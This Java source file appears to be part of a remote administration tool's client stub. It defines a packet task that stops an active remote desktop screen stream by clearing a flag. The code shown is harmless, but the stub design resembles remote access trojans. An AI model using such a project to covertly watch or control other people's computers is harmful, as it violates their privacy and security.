package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.client.threads.RemoteDesktopStream;

import java.io.IOException;

/**
 * Created by Josh on 22/06/2015.
 */
public class RemoteDesktopStopTask extends PacketTask {

    public RemoteDesktopStopTask() {
        super(Packets.REMOTE_DESKTOP_STOP.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        if(RemoteDesktopStartTask.remoteDesktopStream.isAlive())
            RemoteDesktopStream.isStreaming = false;
    }
}
